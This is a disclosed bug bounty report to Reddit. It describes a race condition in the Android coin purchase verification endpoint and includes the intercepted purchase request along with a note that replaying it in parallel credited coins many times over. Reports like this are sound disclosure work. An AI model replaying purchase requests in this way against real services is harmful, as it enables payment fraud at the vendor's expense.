# Race condition leads to Inflation of coins when bought via Google Play Store at endpoint https://oauth.reddit.com/api/v2/gold/android/verify_purchase 

## Report Details
- **Report ID**: 801743
- **URL**: https://hackerone.com/reports/801743
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-21T14:59:18.012Z
- **Disclosed**: 2021-10-27T14:08:20.920Z

## Reporter
- **Username**: yashrs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
Hi,

## Summary:
When we purchase coins from Reddit's mobile app using Android, https://oauth.reddit.com/api/v2/gold/android/verify_purchase is called with parameters like `transaction_id` and `token`. There exists a race condition on this endpoint which allows an attacker to get coins many times more than it was intended to.


## Steps To Reproduce:
- Go to the Reddit app, click on the top right corner which has a coin icon and says `Get`:

- Select a basic 50 coins package, and intercept this request when the purchase is completed:

```
POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
Authorization: Bearer REDACTED
Client-Vendor-ID: REDACTED
x-reddit-device-id: REDACTED
User-Agent: Reddit/Version 2020.5.0/Build 255357/Android 9
X-Dev-Ad-Id: REDACTED
x-reddit-session: REDACTED
x-reddit-loid: REDACTED
x-reddaid: REDACTED
Content-Type: application/x-www-form-urlencoded
Content-Length: 327
Host: oauth.reddit.com
Connection: keep-alive
Accept-Encoding: gzip, deflate

transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd
```

- We can simply repeat this request in parallel to get more coins.

I did 10 parallel requests and got 9 of them through. An actual attacker will do more requests and get more coins. Like for example, they can do 40 requests and maybe if 35 of them get through they have 35x times the coins intended.

Transaction ID for reference: `GPA.3390-9967-2355-57063`

Proof:
{F724269}
{F724270}
{F724271}
███

Regards,
Yash

## Impact

Due to a race condition on https://oauth.reddit.com/api/v2/gold/android/verify_purchase, an attacker can get more coins than what they purchased it for. This can lead to a huge business loss for Reddit, that's why I have marked this as High.

## Attachments
- Screenshot_20200221-201400.jpg
- Screen_Shot_2020-02-21_at_8.26.55_PM.png
- Screen_Shot_2020-02-21_at_8.26.39_PM.png
